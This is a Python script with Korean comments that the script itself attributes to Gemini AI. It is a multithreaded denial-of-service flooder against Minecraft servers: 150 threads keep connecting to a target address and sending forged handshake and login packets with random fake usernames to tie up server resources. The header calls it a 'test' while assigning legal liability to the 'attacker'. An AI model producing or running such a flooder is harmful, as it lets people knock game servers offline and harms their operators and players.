# 사용으로 인한 피해 및 손실, 법적 피해 보상은 모두 공격자(스크립트 실행자) 에게 있음을 숙지 하였음을 인지한 상태로 실행하십시오.
# 이 코드는 Gemini Ai 로 제작된 코드 입니다.
# 이 코드는 오픈소스 이며 "전혀 피해의 목적" 이 아닌 "테스트" 용도로 만들어 졌습니다.

# stop 을 터미널에 입력하면, 코드의 실행이 중단 됩니다.

import socket
import threading
import sys
import struct
import time

# --- 설정 정보 ---
target_host = "192.168.0.1"
target_port = 25565
threads_count = 150 # 기본 150 값
stop_flag = False


def encode_varint(data):
    """마인크래프트에서 사용하는 VarInt 형식으로 숫자를 변환"""
    ordinal = b''
    while True:
        byte = data & 0x7F
        data >>= 7
        if data:
            ordinal += struct.pack('B', byte | 0x80)
        else:
            ordinal += struct.pack('B', byte)
            break
    return ordinal


def create_handshake_packet(host, port):
    """마인크래프트 Handshake 패킷 + Login Start 패킷 생성"""
    # 1. Handshake Packet (ID: 0x00)
    protocol_version = encode_varint(763)  # 1.20.1 버전 기준
    host_bytes = host.encode('utf-8')
    host_len = encode_varint(len(host_bytes))
    port_bytes = struct.pack('>H', port)
    next_state = encode_varint(2)  # 2는 'Login' 상태를 의미

    handshake = b'\x00' + protocol_version + host_len + host_bytes + port_bytes + next_state
    handshake_packet = encode_varint(len(handshake)) + handshake

    # 2. Login Start Packet (ID: 0x00)
    user_name = b'FakeUser_' + os.urandom(4).hex().encode()  # 매번 다른 닉네임 생성
    user_name_len = encode_varint(len(user_name))

    # UUID 생략 가능한 버전(1.19+) 대응을 위한 빈 데이터 혹은 더미 UUID
    login_start = b'\x00' + user_name_len + user_name + b'\x00'
    login_start_packet = encode_varint(len(login_start)) + login_start

    return handshake_packet + login_start_packet


def attack():
    global stop_flag
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((target_host, target_port))

            # 정밀하게 구성된 마인크래프트 패킷 전송
            packet = create_handshake_packet(target_host, target_port)
            s.send(packet)

            # 서버가 응답을 처리할 시간을 아주 잠깐 준 뒤 닫기 (자원 점유)(원본 1024 값)
            s.recv(100)
            s.close()
        except:
            continue




# --- 실행부 ---
import os

print(f"[*] 마인크래프트 정밀 패킷 테스트 시작: {target_host}")
print("[*] 종료하려면 'stop'을 입력하세요.")

for i in range(threads_count):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    if sys.stdin.readline().strip().lower() == "stop":
        stop_flag = True
        break

print("[*] 테스트를 종료합니다.")

